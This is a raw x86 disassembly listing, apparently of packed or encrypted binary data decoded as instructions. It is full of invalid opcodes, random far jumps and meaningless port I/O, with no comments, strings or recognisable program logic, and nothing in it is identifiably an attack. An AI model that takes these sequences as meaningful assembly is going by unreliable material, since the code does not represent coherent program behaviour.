  42f7a1:	js     0x42f80c
  42f7a3:	inc    esi
  42f7a4:	mov    BYTE PTR [edx+0x21cdd910],dl
  42f7aa:	mov    eax,0x80c44a0f
  42f7af:	jae    0x42f784
  42f7b1:	cmp    eax,0x20acebcd
  42f7b6:	inc    ecx
  42f7b7:	out    0x22,al
  42f7b9:	push   ss
  42f7ba:	scas   eax,DWORD PTR es:[edi]
  42f7bb:	shl    BYTE PTR [ecx+ebp*4+0x795626fd],1
  42f7c2:	jmp    0x78fa:0x979d9fe
  42f7c9:	jmp    0x10e0f8c8
  42f7ce:	xchg   edx,eax
  42f7cf:	fisubr DWORD PTR [eax+0x6d]
  42f7d2:	sub    eax,0x98757c5c
  42f7d7:	std    
  42f7d8:	pop    eax
  42f7d9:	and    edi,DWORD PTR [edi+ecx*1-0x2d8d5917]
  42f7e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f7e1:	inc    esi
  42f7e2:	adc    BYTE PTR [eax-0x2d285304],dl
  42f7e8:	pop    esp
  42f7e9:	enter  0x8cbc,0x3d
  42f7ed:	inc    edi
	...
  42f856:	jno    0x42f7f9
  42f858:	(bad)  
  42f859:	test   al,0xd6
  42f85b:	(bad)  
  42f85c:	jg     0x42f857
  42f85e:	push   cs
  42f85f:	pop    ebp
  42f860:	push   ebp
  42f861:	mov    edi,0x90f3f2d2
  42f866:	addr16 std 
  42f868:	add    DWORD PTR [eax],eax
  42f86a:	add    BYTE PTR [ecx],al
  42f86c:	add    BYTE PTR [eax],al
  42f86e:	pop    ebp
  42f86f:	pop    eax
  42f870:	cmp    BYTE PTR [eax-0x53],bl
  42f873:	mov    eax,0x6d6ca88
  42f878:	fcmovu st,st(2)
  42f87a:	pop    ebp
  42f87b:	add    ch,BYTE PTR [edi-0x458322ee]
  42f881:	pop    esp
  42f882:	mov    cl,0x8c
  42f884:	lock sar BYTE PTR [esi+0x19],1
  42f888:	mov    edi,0xa77aaf93
  42f88d:	test   eax,0xaf0e13ed
  42f892:	ins    DWORD PTR es:[edi],dx
  42f893:	nop
  42f894:	std    
  42f895:	cmp    BYTE PTR [ebx+0x2d],bl
  42f898:	mov    bl,0x6b
  42f89a:	loopne 0x42f89d
  42f89c:	mov    ecx,0xeedf4ff7
  42f8a1:	std    
  42f8a2:	shr    BYTE PTR [edi],cl
  42f8a4:	inc    ecx
  42f8a5:	xchg   ebp,eax
  42f8a6:	mov    bh,0x73
  42f8a8:	xor    eax,0x4357676
  42f8ad:	ror    al,0xc9
  42f8b0:	popa   
  42f8b1:	inc    esi
  42f8b2:	fistp  QWORD PTR [edi]
  42f8b4:	cmp    ch,BYTE PTR [esi+ebp*2]
  42f8b7:	aas    
  42f8b8:	mov    dl,0x57
  42f8ba:	ds ds push ebx
  42f8bd:	inc    dh
  42f8bf:	cdq    
  42f8c0:	ret    
  42f8c1:	daa    
  42f8c2:	cmp    DWORD PTR [ecx-0x5aa00979],ebx
  42f8c8:	sahf   
  42f8c9:	xchg   ebp,eax
  42f8ca:	aad    0x9
  42f8cc:	sbb    dl,dl
  42f8ce:	and    DWORD PTR gs:[ebx],esi
  42f8d1:	or     al,0x3f
  42f8d3:	adc    DWORD PTR [ecx+0x723b3208],edx
  42f8d9:	scas   al,BYTE PTR es:[edi]
  42f8da:	scas   al,BYTE PTR es:[edi]
  42f8db:	(bad)  
  42f8dc:	fisub  WORD PTR ds:0xee7d2b3a
  42f8e2:	pusha  
  42f8e3:	loop   0x42f8ed
  42f8e5:	adc    DWORD PTR [ecx],ecx
  42f8e7:	mov    ds:0xf739a1d9,eax
  42f8ec:	imul   esp,DWORD PTR [ecx],0xf9344a12
  42f8f2:	push   ebx
  42f8f3:	fidivr DWORD PTR [eax+0x64cb5fab]
  42f8f9:	mov    es,WORD PTR [ebp+esi*1-0x63e55d74]
  42f900:	mov    edx,0x5f661505
  42f905:	sub    DWORD PTR [edi+0x69],0x24
  42f909:	inc    ebp
  42f90a:	or     eax,0xe3805c86
  42f90f:	inc    ecx
  42f910:	hlt    
  42f911:	aam    0x35
  42f913:	aam    0xe5
  42f915:	rol    DWORD PTR [esi],0x79
  42f918:	mov    dl,0x9
  42f91a:	mov    tr0,esi
  42f91d:	lahf   
  42f91e:	outs   dx,BYTE PTR ds:[esi]
  42f91f:	adc    DWORD PTR gs:[edx-0x171a1613],0x6f69c61b
  42f92a:	jecxz  0x42f90c
  42f92c:	and    al,0x1
  42f92e:	lods   al,BYTE PTR ds:[esi]
  42f92f:	arpl   WORD PTR gs:[edi-0x6],sp
  42f933:	lds    ebx,FWORD PTR [eax-0x15ebc7fd]
  42f939:	daa    
  42f93a:	mov    ecx,0x1bb14699
  42f93f:	pop    esi
  42f940:	stc    
  42f941:	retf   0x9e34
  42f944:	xchg   ebx,eax
  42f945:	dec    edx
  42f946:	jl     0x42f9b1
  42f948:	imul   BYTE PTR [ebx-0x747a76fc]
  42f94e:	push   ss
  42f94f:	aam    0xcb
  42f951:	pop    ss
  42f952:	arpl   WORD PTR [ecx-0x7c],di
  42f955:	fdiv   DWORD PTR [esi-0x74]
  42f958:	push   cs
  42f959:	outs   dx,DWORD PTR ds:[esi]
  42f95a:	push   eax
  42f95b:	jo     0x42f9c6
  42f95d:	lods   al,BYTE PTR ds:[esi]
  42f95e:	push   ebp
  42f95f:	(bad)  
  42f960:	pop    esp
  42f961:	pushf  
  42f962:	mov    ebp,0x597411cd
  42f967:	sub    ah,dl
  42f969:	sar    DWORD PTR [ebp-0x49],0x47
  42f96d:	jmp    0x42f96f
	...
  42f9d3:	add    BYTE PTR [eax],al
  42f9d5:	add    BYTE PTR [esp+esi*2],dl
  42f9d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f9d9:	push   ebp
  42f9da:	in     al,0xd5
  42f9dc:	cmc    
  42f9dd:	jne    0x42f98a
  42f9df:	sbb    cl,dh
  42f9e1:	js     0x42fa4b
  42f9e3:	rcl    BYTE PTR [eax],1
  42f9e5:	packuswb mm7,mm6
  42f9e8:	add    DWORD PTR [eax],eax
  42f9ea:	add    BYTE PTR [ecx],al
  42f9ec:	add    BYTE PTR [eax],al
  42f9ee:	jmp    0x5aad:0x820c6e58
  42f9f5:	xchg   edi,eax
  42f9f6:	push   0x4f2c9ff3
  42f9fb:	stos   DWORD PTR es:[edi],eax
  42f9fc:	pusha  
  42f9fd:	add    eax,0x8a27f4b7
  42fa02:	fidivr DWORD PTR [esi-0x2eac38a4]
  42fa08:	(bad)  
  42fa09:	mov    dl,0x52
  42fa0b:	inc    ebx
  42fa0c:	or     DWORD PTR ds:[esi+0x2d34e304],esp
  42fa13:	call   0x1ca:0x9d521336
  42fa1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fa1b:	push   ebp
  42fa1c:	pop    edx
  42fa1d:	test   al,0xec
  42fa1f:	(bad)  
  42fa20:	aam    0x78
  42fa22:	ds push 0x74
  42fa25:	push   ds
  42fa26:	add    al,0x78
  42fa28:	lock fnsave [ebx+0x66c8b7b4]
  42fa2f:	push   esi
  42fa30:	add    ah,BYTE PTR [ecx]
  42fa32:	xchg   ecx,eax
  42fa33:	aas    
  42fa34:	cmp    ebx,DWORD PTR [ebx-0x14]
  42fa37:	xor    eax,0x8c0b7373
  42fa3c:	in     eax,dx
  42fa3d:	(bad)  
  42fa3e:	mov    eax,ds:0x66a1b013
  42fa43:	mov    WORD PTR [esi],es
  42fa45:	dec    eax
  42fa46:	ret    0xd04b
  42fa49:	mov    bl,0x52
  42fa4b:	mov    al,0x9d
  42fa4d:	lods   al,BYTE PTR ds:[esi]
  42fa4e:	fst    QWORD PTR ds:0xbeddd4f4
  42fa54:	mov    ds:0x7b5b71a9,eax
  42fa59:	and    al,0xd
  42fa5b:	pop    es
  42fa5c:	or     dl,bl
  42fa5e:	xchg   esi,eax
  42fa5f:	mov    bl,0x9e
  42fa61:	mov    ch,0xa0
  42fa63:	and    ecx,DWORD PTR [eax+0x5c491d99]
  42fa69:	push   ds
  42fa6a:	lock xchg esi,eax
  42fa6c:	pushf  
  42fa6d:	sub    ebx,DWORD PTR [ebx]
  42fa6f:	es mov ebx,0xc12c9558
  42fa75:	ja     0x42fa41
  42fa77:	je     0x42fa8f
  42fa79:	inc    ebp
  42fa7a:	mov    eax,ds:0xcc863d36
  42fa7f:	add    ebp,DWORD PTR [esi]
  42fa81:	cmp    al,0xea
  42fa83:	sahf   
  42fa84:	ja     0x42fa56
  42fa86:	hlt    
  42fa87:	mov    dh,0x10
  42fa89:	js     0x42faaa
  42fa8b:	imul   edx,DWORD PTR [ebp+0x21],0xbff24aea
  42fa92:	call   0xdcbf:0xa68649e7
  42fa99:	nop
  42fa9a:	pop    esp
  42fa9b:	jle    0x42fb1c
  42fa9d:	push   ecx
  42fa9f:	bnd jl 0x42fa2f
  42faa2:	sub    dl,BYTE PTR [ebx+0x157c38fd]
  42faa8:	jnp    0x42fa46
  42faaa:	jecxz  0x42fac6
  42faac:	pop    eax
  42faad:	sub    DWORD PTR [esi-0x3c],ecx
  42fab0:	xchg   BYTE PTR ds:0x86f369f3,dh
  42fab6:	shl    BYTE PTR [edi+0x42b5c8a7],0xb9
  42fabd:	pop    edx
  42fabe:	test   edi,edi
  42fac0:	mov    ebp,0x2184d9d
  42fac5:	retf   
  42fac6:	mov    edi,0x7cec48da
  42facb:	test   al,0x4d
  42facd:	mov    ss,WORD PTR [esi]
  42facf:	cmc    
  42fad0:	mov    edi,0xc26eac06
  42fad5:	mov    cl,0xad
  42fad7:	aaa    
  42fad8:	mov    edx,0xd402f957
  42fadd:	mov    BYTE PTR [eax-0x265001ef],dl
  42fae3:	das    
  42fae4:	fwait
  42fae5:	and    eax,DWORD PTR [esi-0x4c0a1c09]
  42faeb:	repz cdq 
  42faed:	cdq    
	...
  42fb56:	sbb    ebp,edi
  42fb58:	shl    BYTE PTR [esi],0xf4
  42fb5b:	aas    
  42fb5c:	(bad)  
  42fb5d:	out    dx,eax
  42fb5e:	int3   
  42fb5f:	mov    WORD PTR [edi+0x32],?
  42fb62:	push   ecx
  42fb63:	and    eax,0xff672fe0
  42fb68:	add    DWORD PTR [eax],eax
  42fb6a:	add    BYTE PTR [ecx],al
  42fb6c:	add    BYTE PTR [eax],al
  42fb6e:	out    dx,al
  42fb6f:	nop
  42fb70:	lods   al,BYTE PTR ds:[esi]
  42fb71:	imul   DWORD PTR [edx+0x23]
  42fb74:	and    DWORD PTR [edx+0x70],0xf584091c
  42fb7b:	jecxz  0x42fbbe
  42fb7d:	gs mov dl,0x49
  42fb80:	and    eax,0x22954133
  42fb85:	pop    eax
  42fb86:	xlat   BYTE PTR ds:[ebx]
  42fb87:	jae    0x42fb27
  42fb89:	or     al,0xa
  42fb8b:	mov    cl,0x6e
  42fb8d:	loopne 0x42fb81
  42fb8f:	pusha  
  42fb90:	dec    edi
  42fb91:	out    0xfd,eax
  42fb93:	xchg   esp,eax
  42fb94:	in     eax,dx
  42fb95:	int    0x6c
  42fb97:	std    
  42fb98:	jmp    0x9a86:0x34574798
  42fb9f:	pusha  
  42fba0:	push   es
  42fba1:	sub    ch,BYTE PTR [edi]
  42fba3:	push   edx
  42fba4:	push   es
  42fba5:	ins    BYTE PTR es:[edi],dx
  42fba6:	jmp    0x42fba4
  42fba8:	mov    esp,DWORD PTR [ecx-0x5f]
  42fbab:	cmp    BYTE PTR [ecx+0x14a7366d],dl
  42fbb1:	mov    esp,0x30161913
  42fbb6:	add    al,0xd6
  42fbb8:	pop    ss
  42fbb9:	cmc    
  42fbba:	mov    ebx,0x72b59b31
  42fbbf:	add    eax,0x6c9ae966
  42fbc4:	xor    dh,BYTE PTR [ebp+0x2fe0818c]
  42fbca:	mov    ch,0x13
  42fbcc:	mov    BYTE PTR [eax],cl
  42fbce:	mov    edi,DWORD PTR [ebp+0x6d]
  42fbd1:	pop    esp
  42fbd2:	add    edi,DWORD PTR [edx-0x24fc16db]
  42fbd8:	sahf   
  42fbd9:	push   esp
  42fbda:	push   eax
  42fbdb:	or     esi,ebp
  42fbdd:	xor    edi,esp
  42fbdf:	idiv   BYTE PTR [esi+0x22]
  42fbe2:	xor    al,0xfa
  42fbe4:	lods   eax,DWORD PTR ds:[esi]
  42fbe5:	loope  0x42fc65
  42fbe7:	pop    eax
  42fbe8:	pop    ss
  42fbe9:	call   0x650a:0xa4e98adc
  42fbf0:	mov    bl,0x2e
  42fbf2:	and    DWORD PTR [ecx+ebx*4-0x62],esp
  42fbf6:	mov    cl,0x29
  42fbf8:	lods   eax,DWORD PTR ds:[esi]
  42fbf9:	(bad)  
  42fbfa:	out    0xf3,al
  42fbfc:	pop    edi
  42fbfd:	pop    ds
  42fbfe:	pop    ebx
  42fbff:	enter  0xca0d,0x9f
  42fc03:	mov    ds:0x1a1735a2,eax
  42fc08:	push   edx
  42fc09:	outs   dx,DWORD PTR ds:[esi]
  42fc0a:	push   0xffffff92
  42fc0c:	ret    
  42fc0d:	mov    dl,0xae
  42fc0f:	xchg   edx,eax
  42fc10:	xchg   ecx,eax
  42fc11:	(bad)  
  42fc12:	aam    0x81
  42fc14:	jp     0x42fc41
  42fc16:	push   cs
  42fc17:	jns    0x42fbb0
  42fc19:	je     0x42fc76
  42fc1b:	jns    0x42fc07
  42fc1d:	jg     0x42fbac
  42fc1f:	add    dh,BYTE PTR [esi+0x2e]
  42fc22:	repnz ins DWORD PTR es:[edi],dx
  42fc24:	stos   BYTE PTR es:[edi],al
  42fc25:	mov    ah,0xcd
  42fc27:	in     al,0x4b
  42fc29:	sub    dl,BYTE PTR [ebp+0x3a]
  42fc2c:	outs   dx,BYTE PTR ds:[esi]
  42fc2d:	cwde   
  42fc2e:	push   ebx
  42fc2f:	push   esi
  42fc30:	mov    al,ds:0xc342c6f5
  42fc35:	pop    esp
  42fc36:	jmp    0x42fca5
  42fc38:	and    al,0x50
  42fc3a:	ret    0x1b3
  42fc3d:	sbb    eax,0xea40cc88
  42fc42:	mov    al,0xbb
  42fc44:	pop    edi
  42fc45:	(bad)  
  42fc46:	repnz adc dh,BYTE PTR [ecx-0x104c53e2]
  42fc4d:	sub    edx,ecx
  42fc4f:	test   al,0xe3
  42fc51:	in     al,dx
  42fc52:	in     al,dx
  42fc53:	int    0xa8
  42fc55:	mov    al,0xfe
  42fc57:	push   ebx
  42fc58:	mov    eax,0xa24bfe54
  42fc5d:	push   0xff3b1656
  42fc62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fc63:	out    dx,eax
  42fc64:	mov    ebp,0x1a9610ea
  42fc69:	sbb    DWORD PTR [esi+0x5f],ecx
  42fc6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fc6d:	and    eax,DWORD PTR [eax]
	...
  42fcd3:	add    BYTE PTR [eax],al
  42fcd5:	add    BYTE PTR [ebx],cl
  42fcd7:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  42fcdd:	call   0xa451:0x2036325e
  42fce4:	adc    DWORD PTR [edi+0x20067],0x100
  42fcee:	pop    esi
  42fcef:	inc    ebx
  42fcf0:	push   edi
  42fcf1:	jge    0x42fcee
  42fcf3:	or     DWORD PTR [esi-0x663e1f1],ecx
  42fcf9:	mov    ds:0x60bd02b9,eax
  42fcfe:	mov    dl,0x12
  42fd00:	stos   BYTE PTR es:[edi],al
  42fd01:	cld    
  42fd02:	call   0x63b5:0xf272b5e
  42fd09:	shr    DWORD PTR [ebx+eax*1],0x99
  42fd0d:	adc    esi,DWORD PTR [edx-0x7b]
  42fd10:	ins    DWORD PTR es:[edi],dx
  42fd11:	stc    
  42fd12:	shl    DWORD PTR [ecx*1-0x7da2c86e],1
  42fd19:	sub    BYTE PTR [edi-0x33],dl
  42fd1c:	test   DWORD PTR [esi-0x32],edx
  42fd1f:	mov    ebp,0x8675d481
  42fd24:	jno    0x42fccf
  42fd26:	sbb    ch,bh
  42fd28:	into   
  42fd29:	jecxz  0x42fcf3
  42fd2b:	(bad)  
  42fd2c:	outs   dx,BYTE PTR ds:[esi]
  42fd2d:	sbb    dh,BYTE PTR [ecx]
  42fd2f:	mov    edi,0x2b98e1d3
  42fd34:	retf   0x33a2
  42fd37:	jmp    0x42fd51
  42fd39:	inc    esp
  42fd3a:	mov    dl,0x68
  42fd3c:	xchg   DWORD PTR [ebp+edx*1-0x34556e78],ebp
  42fd43:	dec    esp
  42fd44:	dec    esp
  42fd45:	inc    edi
  42fd47:	mov    eax,0xb1e4303
  42fd4c:	loopne 0x42fd89
  42fd4e:	test   eax,0x60d154c4
  42fd53:	cmc    
  42fd54:	sub    eax,0xcc8717fb
  42fd59:	fwait
  42fd5a:	mov    eax,0x30fb2ac0
  42fd5f:	xor    bh,0x72
  42fd62:	fwait
  42fd63:	jecxz  0x42fd7e
  42fd65:	push   eax
  42fd66:	or     dh,dh
  42fd68:	and    BYTE PTR [ebx-0x33],dh
  42fd6b:	add    DWORD PTR [ebx-0x53ba9ebd],0xfffffffd
  42fd72:	imul   ebp,ecx,0xffffffcd
  42fd75:	and    ah,cl
  42fd77:	test   BYTE PTR [edi-0x9138acc],ah
  42fd7d:	mov    cl,0xcf
  42fd7f:	in     eax,dx
  42fd80:	mov    cl,0xec
  42fd82:	jno    0x42fdd7
  42fd84:	inc    esp
  42fd85:	imul   DWORD PTR [edi-0x63]
  42fd88:	pop    ebx
  42fd89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fd8a:	push   ss
  42fd8b:	sbb    eax,0xc3ba6d06
  42fd90:	shr    BYTE PTR [ebx-0x4d1203f0],0x61
  42fd97:	jl     0x42fe0f
  42fd99:	stos   DWORD PTR es:[edi],eax
  42fd9a:	test   DWORD PTR [esi+0x7],edi
  42fd9d:	je     0x42fdb7
  42fd9f:	xchg   BYTE PTR [ecx],bl
  42fda1:	outs   dx,DWORD PTR ds:[esi]
  42fda2:	sub    ebp,DWORD PTR [edi+0x18]
  42fda5:	(bad)  
  42fda6:	stos   DWORD PTR es:[edi],eax
  42fda7:	add    edx,DWORD PTR [ecx+0x13cc489f]
  42fdad:	cmc    
  42fdae:	lea    ebp,ds:0xb3579b3a
  42fdb4:	mov    edi,0x86dd989b
  42fdb9:	pop    ds
  42fdba:	out    0x43,al
  42fdbc:	or     edx,DWORD PTR [ebp+0x11e6857e]
  42fdc2:	push   es
  42fdc3:	or     dh,BYTE PTR [eax]
  42fdc5:	pop    esp
  42fdc6:	ins    DWORD PTR es:[edi],dx
  42fdc7:	xlat   BYTE PTR ds:[ebx]
  42fdc8:	sbb    al,0x6f
  42fdca:	or     bh,BYTE PTR [ebx+0x4d7cd49a]
  42fdd0:	ja     0x42fda1
  42fdd2:	adc    edi,DWORD PTR [eax-0x30]
  42fdd5:	jecxz  0x42fdaa
  42fdd7:	iret   
  42fdd8:	call   0x32bc:0x5b34f327
  42fddf:	and    edx,esp
  42fde1:	xor    DWORD PTR [esi-0x41],edx
  42fde4:	push   eax
  42fde5:	jmp    0x19736b32
  42fdea:	push   esp
  42fdeb:	pop    ebx
  42fdec:	add    ecx,DWORD PTR [edi]
	...
  42fe56:	dec    eax
  42fe57:	rol    dl,0xf0
  42fe5a:	retf   0x7af2
  42fe5d:	clc    
  42fe5e:	cmc    
  42fe5f:	inc    edx
  42fe60:	stos   BYTE PTR es:[edi],al
  42fe61:	repz imul ecx,ebx,0x17
  42fe65:	or     ah,BYTE PTR [edi+0x1]
  42fe68:	add    al,BYTE PTR [eax]
  42fe6a:	add    BYTE PTR [ecx],al
  42fe6c:	add    BYTE PTR [eax],al
  42fe6e:	add    DWORD PTR [ecx-0x699034cb],ebx
  42fe74:	gs jl  0x42fef0
  42fe77:	pusha  
  42fe78:	or     DWORD PTR cs:[edi-0x3d20620],0xffffffeb
  42fe80:	jle    0x42fe10
  42fe82:	xchg   esi,eax
  42fe83:	mov    esp,0x30406340
  42fe88:	push   esi
  42fe89:	xchg   ecx,eax
  42fe8a:	in     al,dx
  42fe8b:	dec    edi
  42fe8c:	inc    esp
  42fe8d:	out    0x85,al
  42fe8f:	fndisi(8087 only) 
  42fe91:	and    BYTE PTR [eax],dh
  42fe93:	mov    cl,0x86
  42fe95:	std    
  42fe96:	cwde   
  42fe97:	neg    BYTE PTR [ecx-0x3d181d32]
  42fe9d:	dec    ecx
  42fe9e:	sub    BYTE PTR [esi-0x61],al
  42fea1:	xor    ch,BYTE PTR [ebx+0x6eff4ccf]
  42fea7:	fidivr WORD PTR [ecx+0x1682aa1a]
  42fead:	out    dx,eax
  42feae:	out    dx,al
  42feaf:	mov    ah,0x52
  42feb1:	mov    ds:0x270f0f47,eax
  42feb6:	in     eax,dx
  42feb7:	inc    ecx
  42feb8:	add    BYTE PTR [esi-0x55abbcf3],al
  42febe:	arpl   bp,ax
  42fec0:	lods   eax,DWORD PTR ds:[esi]
  42fec1:	xor    ebp,eax
  42fec3:	loop   0x42fe4b
  42fec5:	std    
  42fec6:	(bad)  [edi+0x5c]
  42fec9:	sub    edi,DWORD PTR [ecx+eax*1]
  42fecc:	push   ecx
  42fecd:	jle    0x42feb2
  42fecf:	jbe    0x42feb8
  42fed1:	dec    ebx
  42fed2:	dec    ebx
  42fed3:	repnz rcr eax,1
  42fed6:	add    DWORD PTR [ebp-0x34cd14f7],eax
  42fedc:	mov    edx,0x8107615a
  42fee1:	call   0xb72a5170
  42fee6:	std    
  42fee7:	add    BYTE PTR [ecx-0x51],dl
  42feea:	mov    cl,0x9c
  42feec:	aaa    
  42feed:	mov    ch,0x97
  42feef:	push   ebp
  42fef0:	scas   al,BYTE PTR es:[edi]
  42fef1:	popf   
  42fef2:	test   al,0xe1
  42fef4:	pop    ebp
  42fef5:	jle    0x42fee7
  42fef7:	pop    esi
  42fef8:	lahf   
  42fef9:	add    edx,edi
  42fefb:	stc    
  42fefc:	adc    bl,BYTE PTR [ecx+0x47]
  42feff:	scas   eax,DWORD PTR es:[edi]
  42ff00:	in     al,0x5e
  42ff02:	nop
  42ff03:	jp     0x42ff75
  42ff05:	iret   
  42ff06:	and    dh,BYTE PTR [eax+0x1d]
  42ff09:	jg     0x42fea8
  42ff0b:	xchg   ebp,eax
  42ff0c:	outs   dx,BYTE PTR ds:[esi]
  42ff0d:	in     eax,0xd1
  42ff0f:	int    0x3b
  42ff11:	mov    bh,0x2c
  42ff13:	cmp    al,0x23
  42ff15:	or     eax,0xcdd96b41
  42ff1a:	xlat   BYTE PTR ds:[ebx]
  42ff1b:	lahf   
  42ff1c:	add    edi,DWORD PTR [eax-0x55373c97]
  42ff22:	and    DWORD PTR [ebx-0x46],ebx
  42ff25:	jb     0x42ff40
  42ff27:	jne    0x42ff74
  42ff29:	lea    eax,[ecx]
  42ff2b:	push   esp
  42ff2c:	leave  
  42ff2d:	(bad)  
  42ff2e:	loop   0x42fee2
  42ff30:	lahf   
  42ff31:	pop    edi
  42ff32:	ja     0x42ffaa
  42ff34:	jnp    0x42fefd
  42ff36:	popa   
  42ff37:	ja     0x42fee2
  42ff39:	sub    cl,dl
  42ff3b:	jg     0x42fed4
  42ff3d:	mov    ah,BYTE PTR [eax-0x5bd75250]
  42ff43:	add    BYTE PTR [edi+0x2610c809],0x77
  42ff4a:	leave  
  42ff4b:	leave  
  42ff4c:	(bad)  
  42ff4d:	call   0x1f792f06
  42ff52:	nop
  42ff53:	(bad)  
  42ff54:	jmp    0xe9197a20
  42ff59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ff5a:	push   ebx
  42ff5b:	ret    
  42ff5c:	push   ecx
  42ff5d:	pop    esp
  42ff5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ff5f:	push   esi
  42ff60:	fndisi(8087 only) 
  42ff62:	out    dx,al
  42ff63:	in     al,dx
  42ff64:	or     DWORD PTR [ecx+ebp*2],edi
  42ff67:	sub    BYTE PTR [edi],ch
  42ff69:	inc    esi
  42ff6a:	and    al,0x9f
  42ff6c:	out    dx,al
  42ff6d:	cmp    al,BYTE PTR [eax]
	...
  42ffd3:	add    BYTE PTR [eax],al
  42ffd5:	add    BYTE PTR [edi+eiz*2],al
  42ffd8:	std    
  42ffd9:	aaa    
  42ffda:	(bad)  
  42ffdb:	mov    edi,0x9ffa77ce
  42ffe0:	shl    DWORD PTR [ecx+ebp*8+0x74],0x5d
  42ffe5:	sub    esp,DWORD PTR [edi+0x2]
  42ffe8:	add    al,BYTE PTR [eax]
  42ffea:	add    BYTE PTR [ecx],al
  42ffec:	add    BYTE PTR [eax],al
  42ffee:	pop    ecx
  42ffef:	mov    ch,0x41
  42fff1:	jno    0x42ffec
  42fff3:	or     eax,0xc6a4528f
  42fff8:	(bad)  
  42fffa:	push   edi
  42fffb:	bound  esi,QWORD PTR [ebp-0x25]
  42fffe:	sbb    ebp,esp
  430000:	mov    ds:0xf08c7a6,al
  430005:	add    BYTE PTR [edi+0x72],bh
  430008:	mov    eax,ds:0x78ea964c
  43000d:	xchg   esp,eax
  43000e:	cmp    BYTE PTR [edi+0x51],ah
  430011:	daa    
  430012:	add    edi,ebp
  430014:	out    dx,al
  430015:	add    eax,0x4cbcb136
  43001a:	xor    BYTE PTR [edx],ch
  43001c:	shl    DWORD PTR [eax-0x191ec444],cl
  430022:	sbb    al,BYTE PTR [edi-0x705d1f3c]
  430028:	jg     0x43008a
  43002a:	push   eax
  43002b:	cli    
  43002c:	mov    ds:0xf776fb1e,al
  430031:	pop    ebx
  430032:	popf   
  430033:	arpl   WORD PTR [ebx],cx
  430035:	xchg   ch,al
  430037:	xchg   ebp,eax
  430038:	aam    0xa5
  43003a:	pop    ebp
  43003b:	jl     0x42ffee
  43003d:	leave  
  43003e:	pop    ebp
  43003f:	inc    esp
  430040:	jae    0x43008a
  430042:	nop
  430043:	(bad)  
  430044:	jmp    0x705b:0x5569dfd5
  43004b:	mov    edx,0xd7625291
  430050:	jns    0x430076
  430052:	popf   
  430053:	nop
  430054:	pop    es
  430055:	adc    bl,al
  430057:	int3   
  430058:	adc    ebx,DWORD PTR [esi-0x47]
  43005b:	sub    al,0xd9
  43005d:	fistp  DWORD PTR [ecx+ebx*4+0x60]
  430061:	jno    0x43009a
  430063:	push   edi
  430064:	sub    ebx,DWORD PTR [ecx]
  430066:	adc    al,0xf4
  430068:	dec    ecx
  430069:	repz int 0x62
  43006c:	stc    
  43006d:	sahf   
  43006e:	out    0x2d,al
  430070:	pop    ss
  430071:	xchg   esp,eax
  430072:	pushf  
  430073:	jno    0x4300c9
  430075:	pop    eax
  430076:	mov    ecx,0x21471ff1
  43007b:	and    ecx,DWORD PTR ds:0xa492f306
  430081:	imul   ebp,ebp,0x32
  430084:	enter  0xe928,0x18
  430088:	fdivr  DWORD PTR [ecx-0x5328a5b0]
  43008e:	xor    dl,BYTE PTR fs:[edi-0x4f5209d4]
  430095:	add    BYTE PTR [edi+0x38],ch
  430098:	movaps xmm5,XMMWORD PTR [ecx]
  43009b:	bound  ebp,QWORD PTR [edx+0x30]
  43009e:	daa    
  43009f:	or     al,BYTE PTR [edi]
  4300a1:	push   edx
  4300a2:	xchg   esi,eax
  4300a3:	mov    eax,ds:0xa389a7fe
  4300a8:	(bad)
  4300ac:	mov    cl,al
  4300ae:	inc    edx
  4300af:	cmp    ah,BYTE PTR [ebp-0x6e]
  4300b2:	pop    ebp
  4300b3:	pop    edx
  4300b4:	xchg   eax,eax
  4300b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4300b7:	ins    BYTE PTR es:[edi],dx
  4300b8:	inc    ebp
  4300b9:	and    al,0xf5
  4300bb:	pop    esp
  4300bc:	dec    ebx
  4300bd:	cli    
  4300be:	mov    al,ds:0x58c466fe
  4300c3:	mov    bh,0x2c
  4300c5:	jns    0x430135
  4300c7:	pop    es
  4300c8:	and    ebx,DWORD PTR [eax+0x11]
  4300cb:	mov    dl,0x4e
  4300cd:	sbb    DWORD PTR ds:0x82f243aa,edx
  4300d3:	aam    0x1e
  4300d5:	pop    edx
  4300d6:	test   al,0xaf
  4300d8:	jne    0x4300b7
  4300da:	sub    cx,WORD PTR [ecx+eax*1]
  4300de:	pop    ss
  4300df:	add    dl,BYTE PTR [edx-0x11]
  4300e2:	call   0x9592a68e
  4300e7:	pop    ds
  4300e8:	xor    esp,DWORD PTR [ebx]
  4300ea:	mov    ebp,0x41c0c
	...
  430153:	add    BYTE PTR [eax],al
  430155:	add    bh,al
  430157:	ins    DWORD PTR es:[edi],dx
  430158:	aam    0xb5
  43015a:	(bad)  
  43015b:	mov    ebp,0x9547fe7
  430160:	scas   eax,DWORD PTR es:[edi]
  430161:	add    al,0x83
  430163:	push   edi
  430164:	shl    DWORD PTR [ebx+0x67],cl
  430167:	add    eax,DWORD PTR [edx]
  430169:	add    BYTE PTR [esi],cl
  43016b:	add    BYTE PTR [eax],al
  43016d:	add    BYTE PTR [edi-0x4216a5b5],ah
  430173:	out    dx,al
  430174:	out    0x4c,al
  430176:	or     al,0x24
  430178:	cld    
  430179:	adc    DWORD PTR [edx],ebp
  43017b:	adc    al,0x0
	...
  4301d5:	add    BYTE PTR [ebp+0x55],cl
  4301d8:	mov    DWORD PTR [ebx-0x7e9e13f8],ecx
  4301de:	mov    esp,ebp
  4301e0:	or     al,ah
  4301e2:	dec    ebp
  4301e3:	add    bh,al
  4301e5:	add    BYTE PTR [eax],cl
  4301e7:	add    BYTE PTR [eax],al
  4301e9:	mov    DWORD PTR [eax],0x3ff44545
  4301ef:	xor    DWORD PTR [eax],eax
  4301f1:	test   DWORD PTR [ebx-0x34070b64],ecx
  4301f7:	(bad)  
  4301f8:	enter  0x4d45,0xb8
  4301fc:	mov    esi,DWORD PTR [edx]
  4301fe:	hlt    
  4301ff:	test   ebx,ecx
  430201:	pushf  
  430202:	enter  0x4df8,0x8b
